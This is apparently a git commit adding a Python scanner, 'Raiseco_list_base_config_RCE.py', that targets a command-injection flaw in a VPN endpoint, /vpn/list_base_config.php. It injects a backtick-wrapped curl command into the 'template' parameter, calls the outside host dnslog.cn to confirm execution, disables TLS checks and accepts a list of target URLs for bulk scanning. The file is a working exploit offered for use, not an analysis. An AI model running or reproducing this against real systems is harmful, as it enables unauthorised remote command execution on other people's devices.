442abb78af52fd01b3a3f0914580848e8cf631e4
ATonysan <149130294+ATonysan@users.noreply.github.com>
2024-08-16 01:52:31 +0800

    Add files via upload

---
+++ Raiseco_list_base_config_RCE.py
@@ -0,0 +1,50 @@
+import requests
+import urllib3
+import re,string,random
+from urllib.parse import urljoin
+import argparse
+import time
+import ssl
+ssl._create_default_https_context = ssl._create_unverified_context
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def read_file(file_path):
+    with open(file_path, 'r') as file:
+        urls = file.read().splitlines()
+    return urls
+
+def check(url):
+    url = url.rstrip("/")
+    try:
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13",
+        }
+        getdomain = requests.get(url='http://dnslog.cn/getdomain.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
+        domain = str(getdomain.text)
+        target_url = urljoin(url,"/vpn/list_base_config.php?type=mod&parts=base_config&template=%60curl%20{}%60".format(domain))
+        requests.get(target_url, verify=False, headers=headers, timeout=40)
+        for i in range(0, 3):
+            refresh = requests.get(url='http://dnslog.cn/getrecords.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
+            time.sleep(2)
+            if domain in refresh.text:
+                print(f"\033[31mDiscovered:{url}: raiseco_list_base_config_RCE!\033[0m")
+                return True
+    except Exception as e:
+        pass
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-u", "--url", help="URL")
+    parser.add_argument("-f", "--txt", help="file")
+    args = parser.parse_args()
+    url = args.url
+    txt = args.txt
+    if url:
+        check(url)
+    elif txt:
+        urls = read_file(txt)
+        for url in urls:
+            check(url)
+    else:
+        print("help")
